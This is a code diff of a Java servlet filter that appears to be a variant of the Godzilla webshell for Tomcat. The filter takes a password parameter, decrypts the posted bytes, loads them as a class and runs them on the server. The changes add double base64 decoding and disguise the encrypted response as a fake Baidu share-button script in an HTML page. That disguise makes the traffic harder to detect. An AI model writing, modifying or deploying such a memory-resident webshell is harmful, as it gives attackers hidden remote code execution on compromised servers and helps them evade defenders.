@@ -27,7 +27,7 @@ import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.util.LifecycleBase;
 
-public class GodzillaFilter extends ClassLoader implements Filter {
+public class GodzillaEkpFilter extends ClassLoader implements Filter {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     String xc = "3c6e0b8a9c15224a";
@@ -36,12 +36,12 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     String md5;
     public String cs;
 
-    public GodzillaFilter() {
+    public GodzillaEkpFilter() {
         this.md5 = md5(this.Pwd + this.xc);
         this.cs = "UTF-8";
     }
 
-    public GodzillaFilter(ClassLoader z) {
+    public GodzillaEkpFilter(ClassLoader z) {
         super(z);
         this.md5 = md5(this.Pwd + this.xc);
         this.cs = "UTF-8";
@@ -95,22 +95,38 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     }
 
     public static byte[] base64Decode(String bs) throws Exception {
-        byte[] value = null;
-
         Class base64;
+        byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
-            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
-        } catch (Exception var6) {
+            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+        } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
-                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
-            } catch (Exception var5) {
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
+            } catch (Exception e2) {}
+        }
+        return value;
+    }
+
+    public static byte[] base64Decode(byte[] bytes) {
+        Class base64;
+        byte[] value = null;
+        Object decoder;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(decoder, new Object[]{bytes});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{new String(bytes)});
+            } catch (Exception e2) {
             }
         }
-
         return value;
     }
 
@@ -176,6 +192,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     }
 
     public String addFilter() throws Exception {
+
         ServletContext servletContext = this.request.getServletContext();
         Filter filter = this;
         String filterName = this.path;
@@ -249,20 +266,48 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             HttpServletRequest request = (HttpServletRequest)req;
             HttpServletResponse response = (HttpServletResponse)resp;
             HttpSession session = request.getSession();
-            byte[] data = base64Decode(req.getParameter(this.Pwd));
-            data = this.x(data, false);
+            byte[] data = base64Decode(request.getParameter(this.Pwd).getBytes());
+            data = base64Decode(data);
+            data = x(data, false);
             if (session.getAttribute("payload") == null) {
-                session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
+                session.setAttribute("payload", (new GodzillaEkpFilter(this.getClass().getClassLoader())).Q(data));
             } else {
                 request.setAttribute("parameters", data);
                 ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                 Object f = ((Class)session.getAttribute("payload")).newInstance();
                 f.equals(arrOut);
                 f.equals(request);
-                response.getWriter().write(this.md5.substring(0, 16));
+//                response.getWriter().write(this.md5.substring(0, 16));
+//                f.toString();
+//                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
+//                response.getWriter().write(this.md5.substring(16));
+
+                // EKP Filter
+                String left = md5.substring(0, 5).toLowerCase();
+                String replacedString = "var Rebdsek_config=".replace("bdsek", left);
+                response.setContentType("text/html");
+                response.getWriter().write("<!DOCTYPE html>");
+                response.getWriter().write("<html lang=\"en\">");
+                response.getWriter().write("<head>");
+                response.getWriter().write("<meta charset=\"UTF-8\">");
+                response.getWriter().write("<title>GetConfigKey</title>");
+                response.getWriter().write("</head>");
+                response.getWriter().write("<body>");
+                response.getWriter().write("<script>");
+                response.getWriter().write("<!-- Baidu Button BEGIN");
+                response.getWriter().write("<script type=\"text/javascript\" id=\"bdshare_js\" data=\"type=slide&amp;img=8&amp;pos=right&amp;uid=6537022\" ></script>");
+                response.getWriter().write("<script type=\"text/javascript\" id=\"bdshell_js\"></script>");
+                response.getWriter().write("<script type=\"text/javascript\">");
+                response.getWriter().write(replacedString);
                 f.toString();
-                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
-                response.getWriter().write(this.md5.substring(16));
+                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
+                response.getWriter().write(";");
+                response.getWriter().write("document.getElementById(\"bdshell_js\").src = \"http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=\" + Math.ceil(new Date()/3600000);");
+                response.getWriter().write("</script>");
+                response.getWriter().write("-->");
+                response.getWriter().write("</script>");
+                response.getWriter().write("</body>");
+                response.getWriter().write("</html>");
 
             }
         } catch (Exception var10) {
